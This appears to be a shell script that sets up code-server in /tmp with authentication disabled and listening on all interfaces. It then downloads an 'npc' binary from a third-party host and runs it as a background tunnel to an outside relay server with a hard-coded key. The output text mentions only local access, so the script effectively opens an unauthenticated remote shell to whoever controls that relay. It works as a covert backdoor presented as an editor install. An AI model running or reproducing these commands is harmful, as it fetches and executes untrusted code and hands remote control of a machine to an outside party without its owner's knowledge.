mkdir /tmp/code_server
cd /tmp/code_server
wget https://github.com/coder/code-server/releases/download/v4.100.2/code-server-4.100.2-linux-amd64.tar.gz ; tar -xzf code-server-4.100.2-linux-amd64.tar.gz ; rm code-server-4.100.2-linux-amd64.tar.gz
cd /tmp/code_server/code-server-4.100.2-linux-amd64
chmod 777 lib/node
mkdir user
mkdir extensions
mkdir config
echo "bind-addr: 0.0.0.0:46683" > ./config/config.yaml
echo "auth: none" >> ./config/config.yaml
echo "cert: false" >> ./config/config.yaml
nohup ./lib/node ./out/node/entry.js --user-data-dir ./user --extensions-dir ./extensions --config ./config/config.yaml -w "Welcome to cod
e server" --disable-telemetry --disable-update-check &
wget https://alist.oasen.work/d/root/npc
chmod 777 npc
nohup ./npc -server=nps.oasen.work:46624 -vkey=ffbcea3e82 -type=tcp &
echo "code-server listen on 0.0.0.0:46683"
echo "You can access it at http://127.0.0.1:46683/"
read -p "Press enter to continue"
